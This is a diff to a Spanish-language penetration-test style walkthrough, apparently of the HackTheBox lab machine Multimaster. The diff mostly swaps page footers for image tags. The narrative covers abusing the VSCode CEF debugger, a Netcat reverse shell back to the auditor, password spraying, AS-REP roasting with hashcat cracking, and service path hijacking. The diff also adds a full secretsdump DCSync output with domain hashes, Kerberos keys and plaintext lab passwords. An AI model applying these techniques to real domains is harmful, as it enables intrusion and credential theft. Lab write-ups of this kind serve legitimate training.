@@ -487,6 +487,8 @@ un vector de acceso remoto mediante el protocolo nativo de administración de Wi
 Se  estableció  una  sesión  interactiva  utilizando  Evil-WinRM,  confirmando  la  autenticidad  de  las
 credenciales y la capacidad de ejecutar comandos en el sistema comprometido.
 
+<img src="assets/41.jpg"> 
+
 La inspección inicial del entorno reveló que el usuario carecía de privilegios elevados y no disponía de
 acceso al directorio C:\inetpub, lo que sugiere un perfil operativo limitado.
 
@@ -497,7 +499,7 @@ El  análisis  del  directorio  Program  Files  evidenció  la  presencia  de  V
 hallazgo relevante dado que ciertas versiones del editor incorporan funcionalidades de depuración remota
 susceptibles de abuso.
 
-<img src="assets/41.jpg"> 
+<img src="assets/42.jpg"> 
 
 La  enumeración  de  procesos  mediante  Get-Process  confirmó  que  múltiples  instancias  de  VSCode  se
 encontraban activas. La verificación de la versión instalada reveló que correspondía a una iteración afectada
@@ -505,6 +507,8 @@ por una vulnerabilidad de ejecución remota de comandos, documentada públicamen
 que  incluye  un  aviso  de  seguridad  emitido  por  Tavis  Ormandy.  Dicho  aviso  detalla  que  el  VSCode
 Remote  Debugger  permanece  habilitado  por  defecto,  exponiendo  un  canal  de  depuración  basado  en
 tecnologías Electron, Chromium y CEF.
+
+<img src="assets/43.jpg"> 
 
 En  este  contexto,  resulta  pertinente  describir  brevemente  el  funcionamiento  del  CEF  debugger.  El
 Chromium  Embedded  Framework  (CEF)  es  una  arquitectura  que  permite  integrar  componentes  del
@@ -516,46 +520,54 @@ Cuando  estas  interfaces  se  encuentran  habilitadas  sin  restricciones,  pue
 obtener  ejecución  arbitraria  de  código  en  el host,  convirtiéndose  en  un  vector  de  explotación  altamente
 eficaz.
 
-19 de agosto de 2026
-
-19
-
 La  búsqueda  de  recursos  relacionados  con  el  aviso  de  Ormandy  condujo  al  repositorio  cefdebug,  que
 proporciona binarios compilados para interactuar con depuradores de Electron, CEF y Chromium.
+
+<img src="assets/44.jpg"> 
 
 Tras descargar y descomprimir la versión correspondiente, el binario fue transferido al servidor mediante
 el comando upload de Evil-WinRM.
 
+<img src="assets/45.jpg"> 
+
 Su  ejecución  permitió  identificar  los  sockets  de  depuración  activos,  confirmando  la  presencia  de  dos
 instancias de CEF debugger escuchando en el sistema.
 
+<img src="assets/46.jpg"> 
+
 Se  procedió  a  validar  la  vulnerabilidad  mediante  la  ejecución  de  código  de  prueba,  lo  que  confirmó  la
 capacidad de interactuar con el servicio y ejecutar instrucciones dentro del contexto del proceso.
+
+<img src="assets/47.jpg"> 
 
 Con la interacción establecida, el siguiente objetivo consistió en obtener una reverse shell. Para ello, se
 levantó un servidor web en el puerto 80 y se emitieron las instrucciones necesarias para descargar un binario
 de Netcat en el host comprometido, preparando así el entorno para establecer un canal de retorno hacia la
 infraestructura del auditor.
 
+<img src="assets/48.jpg"> 
+
 Con el binario de Netcat ya transferido al host comprometido, se procedió a habilitar un listener en el puerto
 9001,  estableciendo  así  el  canal  de  retorno  necesario  para  obtener  una  reverse  shell  desde  el  proceso
 vulnerable.
 
-19 de agosto de 2026
-
-20
+<img src="assets/49.jpg"> 
 
 La ejecución del payload a través del depurador confirmó la capacidad de invocar instrucciones arbitrarias
 en el contexto del proceso de VSCode, lo que permitió materializar la conexión inversa y obtener una sesión
 interactiva plenamente operativa.
 
-Lateral Movement (sbauer)
+<img src="assets/50.jpg"> 
+
+<p align="center"><strong><u>Lateral Movement (sbauer)</u></strong></p>
 
 La inspección del entorno de ejecución reveló que la cuenta cyork pertenecía al grupo Developers, una
 pertenencia especialmente relevante dado que este grupo dispone de permisos de acceso sobre el directorio
 C:\inetpub,  un  enclave  habitual  para  aplicaciones  web  y  servicios  expuestos.  Este  hallazgo  abrió  la
 posibilidad  de  identificar  artefactos  sensibles,  configuraciones  internas  o  componentes  susceptibles  de
 abuso para escalar privilegios o pivotar hacia otros servicios.
+
+<img src="assets/51.jpg"> 
 
 El  análisis  preliminar  del  contenido  de  C:\inetpub  evidenció  la  presencia  de  archivos  y  directorios  de
 interés,  cuya  estructura  y  función  sugerían  la  existencia  de  componentes  web  activos  o  residuales.  La
@@ -564,11 +576,9 @@ lateral,  dado  que  los  directorios  de  publicación  web  suelen  albergar  
 embebidas,  scripts  ejecutables  o  binarios  auxiliares  que  pueden  ser  instrumentalizados  para  obtener
 persistencia o elevar privilegios dentro del sistema comprometido.
 
-19 de agosto de 2026
+<img src="assets/52.jpg"> 
 
-21
-
-Reverse Engineering
+<p align="center"><strong><u>Reverse Engineering</u></strong></p>
 
 El directorio bin dentro de C:\inetpub resultó particularmente sugestivo desde una perspectiva ofensiva. Su
 inspección  minuciosa  reveló  la  presencia  de  la  biblioteca  MultimasterAPI.dll,  un  componente
@@ -577,46 +587,49 @@ el fin de proceder a un análisis estático y dinámico más exhaustivo, se habi
 el módulo smbserver.py de Impacket, lo que permitió transferir la DLL hacia el entorno del auditor de forma
 controlada.
 
+<img src="assets/53.jpg"> 
+
 La operación de copia se realizó tras mapear la unidad remota mediante el comando net use, estableciendo
 así un canal de comunicación persistente entre el host comprometido y la infraestructura del auditor.
+
+<img src="assets/54.jpg"> 
 
 Una vez transferido el archivo, la herramienta file confirmó que se trataba de un ensamblado .NET, lo que
 habilitó  su  apertura  directa  en  ILSpy,  un  editor  y  depurador  especializado  en  ingeniería  inversa  de
 assemblies .NET.
 
-revisión  del  código
+<img src="assets/55.jpg"> 
 
-La
-fuente  descompilado,  concretamente  en  el  espacio  de  nombres
+La revisión  del  código fuente  descompilado,  concretamente  en  el  espacio  de  nombres
 MultimasterAPI.Controllers y dentro del controlador ColleagueController, reveló un hallazgo crítico: una
 cadena de conexión embebida que incluía la contraseña D3veL0pM3nT!.
-
-19 de agosto de 2026
-
-22
 
 La  presencia  de  credenciales  en  código  fuente  constituye  una  mala  praxis  recurrente  en  entornos
 corporativos  y,  en  muchos  casos,  estas  contraseñas  siguen  patrones  reutilizados  o  coherentes  con
 convenciones internas de la organización.
 
+<img src="assets/56.jpg"> 
+
 Por ello, antes de proceder a un password spraying indiscriminado, se verificó la política de contraseñas
 del dominio.
+
+<img src="assets/57.jpg"> 
 
 El análisis de la política reveló que no existían mecanismos de bloqueo de cuentas, lo que eliminaba el
 riesgo de denegación de servicio por intentos fallidos y habilitaba la posibilidad de realizar un password
 spraying  seguro.  Con  esta  información,  se  procedió  a  probar  la  contraseña  obtenida  contra  el  servicio
 WinRM, utilizando la lista de usuarios enumerados previamente.
 
-19 de agosto de 2026
-
-23
+<img src="assets/58.jpg"> 
 
 El resultado confirmó la hipótesis inicial: la contraseña había sido reutilizada. El servicio WinRM aceptó
 las credenciales sbauer / D3veL0pM3nT!, proporcionando acceso remoto al sistema bajo la identidad de
 este usuario. Este hallazgo constituye un vector de escalada lateral significativo, derivado directamente de
 una mala gestión de credenciales en el entorno de desarrollo.
 
-Privilege Escalation
+<img src="assets/59.jpg"> 
+
+<p align="center"><strong><u>Privilege Escalation</u></strong></p>
 
 Para  avanzar  en  la  fase  de  escalada  de  privilegios  dentro  del  dominio,  se  empleó  BloodHound  como
 plataforma  de  enumeración  y  correlación  relacional  de  objetos  de  Active  Directory.  El  ingestor
@@ -624,13 +637,13 @@ bloodhound-python  permitió  recopilar  de  forma  remota  la  totalidad  de  l
 dominio, incluyendo relaciones de control, delegaciones implícitas, ACLs, pertenencias a grupos y rutas de
 privilegio potenciales.
 
-19 de agosto de 2026
-
-24
+<img src="assets/60.jpg"> 
 
 Una vez procesados los datos, la interfaz gráfica de BloodHound facilitó la visualización de las cadenas de
 ataque disponibles, permitiendo identificar vectores de escalada que no serían evidentes mediante técnicas
 manuales.
+
+<img src="assets/61.jpg"> 
 
 En la pestaña Search, se marcó el usuario SBAUER@MEGACORP.LOCAL como owned, habilitando
 así  el  análisis  de  rutas  ascendentes  desde  su  posición  actual.  La  sección  Reachable  High  Value  Targets
@@ -654,15 +667,15 @@ Partiendo  de  la  hipótesis  de  que  el  usuario  Jorden  podría  tener  una
 procedió a deshabilitar la pre-autenticación Kerberos mediante el cmdlet Get-ADUser, aprovechando el
 permiso GenericWrite previamente identificado.
 
+<img src="assets/62.jpg"> 
+
 Con la configuración modificada, se utilizó la herramienta GetNPUser de Impacket para ejecutar un ataque
 de  AS-REP  Roasting,  orientado  a  extraer  el  TGT  cifrado  del  usuario  sin  necesidad  de  conocer  su
 contraseña.
 
-19 de agosto de 2026
+<img src="assets/63.jpg"> 
 
-25
-
-Hashcat
+<p align="center"><strong><u>Hashcat</u></strong></p>
 
 El hash obtenido mediante AS-REP Roasting fue sometido a un ataque de fuerza bruta offline utilizando
 Hashcat. Para ello, se almacenó el material criptográfico en un archivo denominado hash y se procedió a
@@ -670,12 +683,12 @@ identificar el modo adecuado para su descifrado. Dado que el hash correspondía 
 etype 23, se seleccionó el modo 18200, ejecutando posteriormente Hashcat con el diccionario rockyou.txt
 como fuente de candidatos.
 
+<img src="assets/64.jpg"> 
+
 El ataque resultó exitoso, revelando la contraseña rainforest786 asociada al usuario jorden, lo que permitió
 establecer una sesión remota mediante WinRM bajo dicha identidad.
 
-19 de agosto de 2026
-
-26
+<img src="assets/65.jpg"> 
 
 La  pertenencia  de  jorden  al  grupo  Server  Operators  constituye  un  vector  de  escalada  de  privilegios
 especialmente crítico. Este grupo dispone de la capacidad de iniciar, detener y modificar las propiedades
@@ -685,19 +698,23 @@ Server  Operators  en  un  grupo  de  alto  riesgo,  cuya  membresía  debería 
 monitorizada,  especialmente porque  también permite  el  inicio  de  sesión  interactivo  en  controladores  de
 dominio.
 
+<img src="assets/66.jpg"> 
+
 Se procedió a modificar la ruta del binario del servicio vulnerable y se verificó que el cambio había sido
 aplicado correctamente.
+
+<img src="assets/67.jpg"> 
 
 Tras detener y reiniciar el servicio, la ejecución del payload configurado permitió obtener una reverse shell
 con privilegios elevados.
 
-19 de agosto de 2026
-
-27
+<img src="assets/68.jpg"> 
 
 Sin embargo, la sesión resultó inestable, por lo que se optó por una estrategia más robusta: crear un nuevo
 usuario y añadirlo al grupo Administrators, garantizando así un acceso persistente y estable al sistema
 comprometido.
+
+<img src="assets/69.jpg"> 
 
 Con privilegios administrativos, se ejecutó un ataque DCSync, obteniendo las credenciales del dominio
 directamente desde el controlador de dominio. Este ataque, basado en la capacidad de replicación de Active
@@ -705,23 +722,164 @@ Directory, permite extraer hashes NTLM y Kerberos de cualquier cuenta, incluyend
 del dominio, siempre que el atacante disponga de privilegios equivalentes a los de un Domain Controller o
 de un objeto con delegaciones de replicación.
 
-19 de agosto de 2026
+```java
+┌──(usuario㉿kali)-[~/HTB/multimaster/content]
+└─$ impacket-secretsdump usuario:'abcABC1234'@MULTIMASTER.MEGACORP.LOCAL
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
-28
+[*] Target system bootKey: 0xbf52866106a6efc249f28895d39f99d3
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:da044beedf173cf4ada93d034aa820fb:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[*] Dumping cached domain logon information (domain/username:hash)
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC
+MEGACORP\MULTIMASTER$:aes256-cts-hmac-sha1-96:2d3be29fa7a06a73e2b40b2e4c4b8e8b58d5e633955f11bae5d691473ffa1b87
+MEGACORP\MULTIMASTER$:aes128-cts-hmac-sha1-96:43f09b3c121d6c4db6f10d1c71d5b2f8
+MEGACORP\MULTIMASTER$:des-cbc-md5:e04ff81f62f2ec32
+MEGACORP\MULTIMASTER$:plain_password_hex:1131584290b3b726c34316e4fbb32612d2841121f7df08ad77d7d6d42f5c785ef47d2468b1c1936816ff9b2f654b8f00330b8af9ad7109ee65ffc6a56c6e3020258957329f61812e2ccec38a070cab84451ebb1797e54acc0dfa4a2353788807e82c2e67046108d752231e453c9bd120b6354c3882516cd598821d1a7b61d7984220361a7cbbe7d34726d9a200f4a430214937df5bd4b67fb765484a24895b51bbfafd203a068fa289ffb2dda27ea0b1a3e4de8101fb4aaa2c0ca2808b9ead4a0e257dbc9b4894f4586e18e3986ad165fd8c1b8ba8deace7927ea4d67a8877b52a1f13c43461819ddb76ae22a3077f98
+MEGACORP\MULTIMASTER$:aad3b435b51404eeaad3b435b51404ee:3b83f189e17a5444a48ce43fec7f1deb:::
+[*] DefaultPassword
+MEGACORP\cyork:AlanShearer99
+[*] DPAPI_SYSTEM
+dpapi_machinekey:0xcb0cd2ebf20d55c4fa851eca42129b3e8d06494f
+dpapi_userkey:0x13f3f90b1eec99c83ef7f6d03d89b3078156ba27
+[*] NL$KM
+ 0000   99 4F 5D 6C 55 B9 EC B5  0C 0B D8 75 A2 88 93 E4   .O]lU......u....
+ 0010   C0 D9 EF C5 0D B9 40 57  92 39 9A BE 9D A5 83 ED   ......@W.9......
+ 0020   11 CB 71 7C AB 32 CD 11  FD 7A ED 2E AB BE F1 62   ..q|.2...z.....b
+ 0030   58 F2 1D 8A AC 9F AC FB  32 17 D8 EE B3 BD A5 DC   X.......2.......
+NL$KM:994f5d6c55b9ecb50c0bd875a28893e4c0d9efc50db9405792399abe9da583ed11cb717cab32cd11fd7aed2eabbef16258f21d8aac9facfb3217d8eeb3bda5dc
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:69cbf4a9b7415c9e1caf93d51d971be0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:06e3ae564999dbad74e576cdf0f717d3:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+MEGACORP.LOCAL\svc-nas:1103:aad3b435b51404eeaad3b435b51404ee:fe90dcf97ce6511a65151881708d6027:::
+MEGACORP.LOCAL\tushikikatomo:1110:aad3b435b51404eeaad3b435b51404ee:1c9c8bfd28d000e8904f23c280b25d21:::
+MEGACORP.LOCAL\andrew:1111:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
+MEGACORP.LOCAL\lana:1112:aad3b435b51404eeaad3b435b51404ee:3c3c292710286a539bbec397d15b4680:::
+MEGACORP.LOCAL\alice:1601:aad3b435b51404eeaad3b435b51404ee:19b44ab9ec562fe20b35ddb7c6fc0689:::
+MEGACORP.LOCAL\dai:2101:aad3b435b51404eeaad3b435b51404ee:cb8a655c8bc531dd01a5359b40b20e7b:::
+MEGACORP.LOCAL\svc-sql:2102:aad3b435b51404eeaad3b435b51404ee:3a36abdc15d86766d4cd243d8557e10d:::
+MEGACORP.LOCAL\sbauer:3102:aad3b435b51404eeaad3b435b51404ee:050ba67142895b5844a24d5ce9644702:::
+MEGACORP.LOCAL\okent:3103:aad3b435b51404eeaad3b435b51404ee:b7c7e43caa54942a2e85d9c8b4074f04:::
+MEGACORP.LOCAL\ckane:3104:aad3b435b51404eeaad3b435b51404ee:b7c7e43caa54942a2e85d9c8b4074f04:::
+MEGACORP.LOCAL\kpage:3105:aad3b435b51404eeaad3b435b51404ee:b7c7e43caa54942a2e85d9c8b4074f04:::
+MEGACORP.LOCAL\james:3106:aad3b435b51404eeaad3b435b51404ee:b7c7e43caa54942a2e85d9c8b4074f04:::
+MEGACORP.LOCAL\cyork:3107:aad3b435b51404eeaad3b435b51404ee:06327297532725a64e1edec0aad81cfe:::
+MEGACORP.LOCAL\rmartin:3108:aad3b435b51404eeaad3b435b51404ee:b7c7e43caa54942a2e85d9c8b4074f04:::
+MEGACORP.LOCAL\zac:3109:aad3b435b51404eeaad3b435b51404ee:b7c7e43caa54942a2e85d9c8b4074f04:::
+MEGACORP.LOCAL\jorden:3110:aad3b435b51404eeaad3b435b51404ee:90960176fcbfe36b4a69fafb3cc0b716:::
+MEGACORP.LOCAL\alyx:3111:aad3b435b51404eeaad3b435b51404ee:b7c7e43caa54942a2e85d9c8b4074f04:::
+MEGACORP.LOCAL\ilee:3112:aad3b435b51404eeaad3b435b51404ee:b7c7e43caa54942a2e85d9c8b4074f04:::
+MEGACORP.LOCAL\nbourne:3113:aad3b435b51404eeaad3b435b51404ee:b7c7e43caa54942a2e85d9c8b4074f04:::
+MEGACORP.LOCAL\zpowers:3114:aad3b435b51404eeaad3b435b51404ee:b7c7e43caa54942a2e85d9c8b4074f04:::
+MEGACORP.LOCAL\aldom:3115:aad3b435b51404eeaad3b435b51404ee:b7c7e43caa54942a2e85d9c8b4074f04:::
+MEGACORP.LOCAL\jsmmons:3116:aad3b435b51404eeaad3b435b51404ee:b7c7e43caa54942a2e85d9c8b4074f04:::
+MEGACORP.LOCAL\pmartin:3117:aad3b435b51404eeaad3b435b51404ee:b7c7e43caa54942a2e85d9c8b4074f04:::
+usuario:7602:aad3b435b51404eeaad3b435b51404ee:f51df25c6dcd8404d2f88b38423b19d8:::
+MULTIMASTER$:1000:aad3b435b51404eeaad3b435b51404ee:3b83f189e17a5444a48ce43fec7f1deb:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:98c8f1aaae0f1a5487165b37927deb6eeadc470e0b81d7dedef4239d57288747
+Administrator:aes128-cts-hmac-sha1-96:593ee7a6ac6375581b9ecdd339d817d5
+Administrator:des-cbc-md5:1afee316ec6e860e
+krbtgt:aes256-cts-hmac-sha1-96:a6deb907245296f7739153833b79d47ef7a9671b29606d6967e69e8077c43780
+krbtgt:aes128-cts-hmac-sha1-96:8265ceeb32d72dc693156c1243f79563
+krbtgt:des-cbc-md5:ef8cab25086df10d
+MEGACORP.LOCAL\svc-nas:aes256-cts-hmac-sha1-96:9a4d8f1e91a3217a75128299598c7d888443d1dd6020b92c95340ff3dceed0c1
+MEGACORP.LOCAL\svc-nas:aes128-cts-hmac-sha1-96:6601c77c6b491e192223a1e8fea444a9
+MEGACORP.LOCAL\svc-nas:des-cbc-md5:c17a52d35babcb4a
+MEGACORP.LOCAL\tushikikatomo:aes256-cts-hmac-sha1-96:a17e831cc83fb0b985df7a222f8ccf7d2ee4d855331cb6fb26d47f20010405d3
+MEGACORP.LOCAL\tushikikatomo:aes128-cts-hmac-sha1-96:ce39dfd4ee60206e02ee542566bf1d17
+MEGACORP.LOCAL\tushikikatomo:des-cbc-md5:a49ea116df7a8668
+MEGACORP.LOCAL\andrew:aes256-cts-hmac-sha1-96:c25a2c9729cc589c1105a7ea3f97fd5bb95ac1bf7c3f43fa2219f69282c4c392
+MEGACORP.LOCAL\andrew:aes128-cts-hmac-sha1-96:e762d814d6bc915ed18f7785c3493131
+MEGACORP.LOCAL\andrew:des-cbc-md5:1cf7e0dc8c133ea8
+MEGACORP.LOCAL\lana:aes256-cts-hmac-sha1-96:8f40c6dd1bd6d392b5ec361ee5f5370da0ab77d21883d1cf7aa2f0522c152837
+MEGACORP.LOCAL\lana:aes128-cts-hmac-sha1-96:02c50a665fbe3ed69ae65c61f039e93b
+MEGACORP.LOCAL\lana:des-cbc-md5:b9e95eefd952dc5e
+MEGACORP.LOCAL\alice:aes256-cts-hmac-sha1-96:572b78f3faccbc392b63179f36910cf134ac7bac3ccf3f333f13460bc8b22662
+MEGACORP.LOCAL\alice:aes128-cts-hmac-sha1-96:7e393b4520ffff00635e6efc539e9a7e
+MEGACORP.LOCAL\alice:des-cbc-md5:04ae08e037cbe6e6
+MEGACORP.LOCAL\dai:aes256-cts-hmac-sha1-96:2a0c78927c95c9431ad228e9541aa3faf8b43bfd0386ebe10946b7c5ac97bdeb
+MEGACORP.LOCAL\dai:aes128-cts-hmac-sha1-96:230262301df41adcdb81b9906d3920b5
+MEGACORP.LOCAL\dai:des-cbc-md5:765298e319237ad0
+MEGACORP.LOCAL\svc-sql:aes256-cts-hmac-sha1-96:54760b83091aaccf79769d09f6357e9049de311369801625f07ce2788d03096e
+MEGACORP.LOCAL\svc-sql:aes128-cts-hmac-sha1-96:490c9502ebbcc5fcbdf94e3dbbdfabf6
+MEGACORP.LOCAL\svc-sql:des-cbc-md5:70b3daf4d902582c
+MEGACORP.LOCAL\sbauer:aes256-cts-hmac-sha1-96:510973978e1825f06d42a1d7d72131cda4394ff463daa0e6f1a7c45f4f815ba0
+MEGACORP.LOCAL\sbauer:aes128-cts-hmac-sha1-96:d2cd10986be29f29eeacd7aec880c913
+MEGACORP.LOCAL\sbauer:des-cbc-md5:df0b792ab9913ef1
+MEGACORP.LOCAL\okent:aes256-cts-hmac-sha1-96:73c1cde578ce842b2601b4f306a196a6e0dcf6f77aee89a361e17f7db1cc88c3
+MEGACORP.LOCAL\okent:aes128-cts-hmac-sha1-96:b10a5f5891e7490659363e6b18c4ec2e
+MEGACORP.LOCAL\okent:des-cbc-md5:e9e045bf0b7c3d6d
+MEGACORP.LOCAL\ckane:aes256-cts-hmac-sha1-96:47e28dae2b80f58d6b0e0bbdc82c0347b54b6ab5a59c98f3277491fb2d338b22
+MEGACORP.LOCAL\ckane:aes128-cts-hmac-sha1-96:ca968d05cd4a3d1aef15e113762c5b08
+MEGACORP.LOCAL\ckane:des-cbc-md5:89e967b9d531f8fd
+MEGACORP.LOCAL\kpage:aes256-cts-hmac-sha1-96:014431689980a6d80093bf92e7ec747e46adc3e5c130a616d121b7eca481fa6a
+MEGACORP.LOCAL\kpage:aes128-cts-hmac-sha1-96:dd1113113ee2343c7613feb9721ff74a
+MEGACORP.LOCAL\kpage:des-cbc-md5:5b5207f72c5d1320
+MEGACORP.LOCAL\james:aes256-cts-hmac-sha1-96:54fcf58bc4d39096952f9b366a9c0d27f836b3140d91583cefdb81116e471d06
+MEGACORP.LOCAL\james:aes128-cts-hmac-sha1-96:6257b8a8253e75664db277427ad7dc47
+MEGACORP.LOCAL\james:des-cbc-md5:ce26230701e089ab
+MEGACORP.LOCAL\cyork:aes256-cts-hmac-sha1-96:dbdcfc44a72f4c976acec9cd15bb594989634ade78a683a37d5174e3c6b3a550
+MEGACORP.LOCAL\cyork:aes128-cts-hmac-sha1-96:9bf3e36f39c149c5b3dbfda949d9f61f
+MEGACORP.LOCAL\cyork:des-cbc-md5:a7f491314f70430e
+MEGACORP.LOCAL\rmartin:aes256-cts-hmac-sha1-96:cdee6c93315215536b47099517aaf379480f5ad6f27484512abfd286ad453b35
+MEGACORP.LOCAL\rmartin:aes128-cts-hmac-sha1-96:ad4331926678013c0d10d94a43c7d8b4
+MEGACORP.LOCAL\rmartin:des-cbc-md5:6b463885c28fc1ea
+MEGACORP.LOCAL\zac:aes256-cts-hmac-sha1-96:5ee2033f1aef639d295c6bd85710c86b63c421b9b2982fe7956fa5a9d9f91e1b
+MEGACORP.LOCAL\zac:aes128-cts-hmac-sha1-96:7c0830f5c24a978966040f1d4ba2a54b
+MEGACORP.LOCAL\zac:des-cbc-md5:c2fe40f449ef6713
+MEGACORP.LOCAL\jorden:aes256-cts-hmac-sha1-96:538d6436d2446bd3add5e196d7dd7ccc07bc274bec6fa8e3b58c4f6ad0080873
+MEGACORP.LOCAL\jorden:aes128-cts-hmac-sha1-96:95f6e97795cfe39d41f292ca05aad9dc
+MEGACORP.LOCAL\jorden:des-cbc-md5:4576891aae9beff1
+MEGACORP.LOCAL\alyx:aes256-cts-hmac-sha1-96:2813dbd8e4a8505747c0d024ddaf26bdb81bed46d3fd06c686c836a4995e8baf
+MEGACORP.LOCAL\alyx:aes128-cts-hmac-sha1-96:b7f01ebc755d5b4f0e490291f1258475
+MEGACORP.LOCAL\alyx:des-cbc-md5:31798513ae807fe5
+MEGACORP.LOCAL\ilee:aes256-cts-hmac-sha1-96:d11ec507be904edcf375a5b448b2ba38b6e4b110ee7bf2ee839cf18a0879d353
+MEGACORP.LOCAL\ilee:aes128-cts-hmac-sha1-96:7441bd13486a990a24410504f7b5b45e
+MEGACORP.LOCAL\ilee:des-cbc-md5:6d758f19674ff192
+MEGACORP.LOCAL\nbourne:aes256-cts-hmac-sha1-96:309803ce49001b289cebe3098ea626a6f181d4f6a4c82f16c7075839ff865a97
+MEGACORP.LOCAL\nbourne:aes128-cts-hmac-sha1-96:afd355fd0695835244d50e494b91a551
+MEGACORP.LOCAL\nbourne:des-cbc-md5:dc385d1a83912008
+MEGACORP.LOCAL\zpowers:aes256-cts-hmac-sha1-96:180e9050590393d1e1e5b7a5d2f971eb5ebc99306ae57806f949a477dc32a7bc
+MEGACORP.LOCAL\zpowers:aes128-cts-hmac-sha1-96:eb02dd1db27233dbadc106ddfb82ec1c
+MEGACORP.LOCAL\zpowers:des-cbc-md5:7976f2138083160e
+MEGACORP.LOCAL\aldom:aes256-cts-hmac-sha1-96:1490c171e00ce0460fba0314aa8ff359a82c6ac2c2713c85160ccae578299a1b
+MEGACORP.LOCAL\aldom:aes128-cts-hmac-sha1-96:53a9a2c24bd67e3361b2d9efe92037a6
+MEGACORP.LOCAL\aldom:des-cbc-md5:8fcb54e53e2f261f
+MEGACORP.LOCAL\jsmmons:aes256-cts-hmac-sha1-96:06e3cc359533ecb2f582108082530997500073035c01643a7fea7cba851f471b
+MEGACORP.LOCAL\jsmmons:aes128-cts-hmac-sha1-96:94410da2abdf4e963859e62846bac102
+MEGACORP.LOCAL\jsmmons:des-cbc-md5:bf522ab36d315b49
+MEGACORP.LOCAL\pmartin:aes256-cts-hmac-sha1-96:356a94ed6163d042d9d87b28aa327031c59f5f76aa837fd68429ee1f21baaa9c
+MEGACORP.LOCAL\pmartin:aes128-cts-hmac-sha1-96:6ac67d30242db1e246c84467ccae3173
+MEGACORP.LOCAL\pmartin:des-cbc-md5:cdcda7c44970f445
+usuario:aes256-cts-hmac-sha1-96:9a24ce9945153f1784e8419c7538eb378c5813febe4435753dc9b1b71851d8ac
+usuario:aes128-cts-hmac-sha1-96:c05c33cfbecfed6ec51253abab5b5410
+usuario:des-cbc-md5:15e33d8f524fc79b
+MULTIMASTER$:aes256-cts-hmac-sha1-96:2d3be29fa7a06a73e2b40b2e4c4b8e8b58d5e633955f11bae5d691473ffa1b87
+MULTIMASTER$:aes128-cts-hmac-sha1-96:43f09b3c121d6c4db6f10d1c71d5b2f8
+MULTIMASTER$:des-cbc-md5:86c8fb58f1da9bea
+[*] Cleaning up...
+```
 
 Una  vez  obtenidas  las  credenciales  del  administrador,  se  estableció  una  sesión  mediante  WinRM,
 consolidando el control total sobre el dominio.
+
+<img src="assets/70.jpg"> 
 
 Durante  la  enumeración  previa  también  se  identificó  que  el  usuario  jorden  disponía  de  los  privilegios
 SeBackupPrivilege y SeRestorePrivilege, dos permisos de alto impacto que permiten realizar copias y
 restauraciones de archivos protegidos.
 
+<img src="assets/71.jpg"> 
+
 Estos privilegios habilitan técnicas como la copia de archivos sensibles mediante robocopy, incluyendo
 bases de datos del sistema, hives del registro o componentes críticos del controlador de dominio, lo que
 constituye otro vector viable para la obtención de credenciales o la escalada de privilegios.
 
-19 de agosto de 2026
-
-29
-
-
+<img src="assets/72.jpg"> 
